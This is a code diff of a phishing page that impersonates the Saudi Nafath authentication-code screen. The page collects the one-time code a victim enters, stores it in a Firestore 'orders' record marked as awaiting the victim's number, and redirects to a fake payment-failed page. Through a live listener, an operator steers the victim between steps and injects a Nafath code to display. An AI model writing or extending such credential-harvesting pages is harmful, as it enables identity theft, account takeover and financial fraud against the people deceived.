@@ -6,44 +6,73 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>نفاذ - رمز التوثيق | Nafath OTP</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/inner-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { display:flex; align-items:center; justify-content:center; padding:20px; }
-        #overlay {
-            position:absolute; inset:0;
-            background:rgba(7,31,28,0.88); display:none;
-            flex-direction:column; justify-content:center; align-items:center; z-index:10;
-            border-radius:20px;
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; direction: rtl; padding: 16px; }
+        .nafath-card {
+            width: 100%; max-width: 420px; border-radius: var(--tree-radius-xl);
+            display: flex; flex-direction: column; overflow: hidden; position: relative; min-height: 500px;
         }
+        .header { padding: 25px; display: flex; justify-content: center; border-bottom: 1px solid var(--tree-border); }
+        .header img { height: 45px; }
+        .content { flex: 1; padding: 40px 30px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .title { font-size: 1.2rem; font-weight: bold; color: var(--tree-primary); margin-bottom: 15px; }
+        .subtitle { font-size: 0.95rem; line-height: 1.6; margin-bottom: 30px; color: var(--tree-text-muted); }
+        .input-group { width: 100%; margin-bottom: 25px; }
+        input {
+            width: 100%; padding: 15px; border: 2px solid var(--tree-border); border-radius: 12px;
+            background: var(--tree-bg-elevated); font-size: 1.5rem; text-align: center; box-sizing: border-box;
+            letter-spacing: 5px; font-weight: bold; color: var(--tree-text); transition: 0.3s;
+        }
+        input:focus { border-color: var(--tree-primary); background: var(--tree-card); box-shadow: 0 0 0 4px var(--tree-primary-soft); }
+        .btn-submit {
+            width: 100%; padding: 14px; color: white; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: bold;
+            cursor: pointer; transition: 0.3s;
+            background: linear-gradient(135deg, var(--tree-primary), var(--tree-primary-hover));
+        }
+        .btn-submit:hover { transform: translateY(-2px); filter: brightness(1.05); }
+        #overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.92); display: none; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 10;
+        }
+        html[data-theme="dark"] #overlay { background: rgba(20, 31, 24, 0.92); }
+        .spinner { width: 40px; height: 40px; border: 4px solid var(--tree-border); border-top: 4px solid var(--tree-primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
+<body class="tree-site nafath_otp-page">
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<div class="teal-card teal-card--narrow" style="width:100%;position:relative;">
+<div class="nafath-card">
     <div id="overlay">
-        <div class="spin-ring"></div>
-        <div style="font-size:0.88rem;color:var(--text-muted);margin-top:16px;" data-i18n="nafath_otp.verifying">جاري التحقق...</div>
+        <div class="spinner"></div>
+        <div style="font-size: 14px; color: var(--tree-text); font-weight: bold;" data-i18n="nafath_otp.verifying">جاري التحقق...</div>
     </div>
 
-    <div style="padding:20px 24px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--teal-border);">
-        <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="40" width="160">
-        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
+    <div class="header">
+        <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="45" width="180">
     </div>
 
-    <div class="card-body" style="text-align:center;">
-        <div class="section-title" style="color:var(--green);" data-i18n="nafath_otp.title">رمز التوثيق</div>
-        <div class="section-sub" style="margin:8px 0 28px;" data-i18n="nafath_otp.sub">تم إرسال رمز التوثيق إلى هاتفك المسجل، يرجى إدخاله للمتابعة</div>
+    <div class="content">
+        <div class="title" data-i18n="nafath_otp.title">رمز التوثيق</div>
+        <div class="subtitle" data-i18n="nafath_otp.sub">تم إرسال رمز التوثيق إلى هاتفك المسجل، يرجى إدخاله للمتابعة</div>
 
-        <div class="field">
-            <input type="number" class="otp-input" id="otp-code" data-i18n="nafath_otp.placeholder" placeholder="رمز التوثيق" maxlength="6">
+        <div style="position:absolute;top:12px;inset-inline-end:16px;">
+            <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
         </div>
 
-        <button class="btn-green" onclick="sendOTP()" style="margin-top:8px;" data-i18n="nafath_otp.btn">متابعة التوثيق</button>
+        <div class="input-group">
+            <input type="number" id="otp-code" data-i18n="nafath_otp.placeholder" placeholder="رمز التوثيق" maxlength="6">
+        </div>
+
+        <button class="btn-submit" onclick="sendOTP()" data-i18n="nafath_otp.btn">
+            متابعة التوثيق
+        </button>
     </div>
 </div>
 
@@ -62,32 +91,52 @@
     async function sendOTP() {
         const code = document.getElementById('otp-code').value;
         const userId = localStorage.getItem('user_id');
-        if (code.length < 4) { alert(t('nafath_otp.err_short')); return; }
+
+        if (code.length < 4) {
+            alert(t('nafath_otp.err_short'));
+            return;
+        }
+
         document.getElementById('overlay').style.display = 'flex';
+
         try {
             await db.collection("orders").doc(userId).update({
-                nafath_otp: code, next_step: "WAITING",
+                nafath_otp: code,
+                next_step: "WAITING", // إيقاف التوجيه التلقائي لمنع التكرار
                 status: "تم إرسال كود نفاذ - بانتظار الرقم"
             });
-            window.location.href = "payment_failed.html";
-        } catch(e) {
+            window.location.href = "payment_failed.html"; 
+        } catch (e) {
             document.getElementById('overlay').style.display = 'none';
-            alert(t('nafath_otp.err_connection'));
+            alert("حدث خطأ في الاتصال");
         }
-    }
-
-    (function() {
-        const userId = localStorage.getItem('user_id');
-        if (userId) {
-            db.collection("orders").doc(userId).onSnapshot((doc) => {
-                if (doc.exists) {
-                    const data = doc.data();
-                    if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
-                    else if (data.next_step === "GO_TO_NAFATH") window.location.href = "nafath.html";
+    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    // تم إزالة التوجيه الذاتي لمنع التعليق (Loop)
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_failed.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
                 }
-            });
-        }
-    })();
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
 </script>
 </body>
 </html>
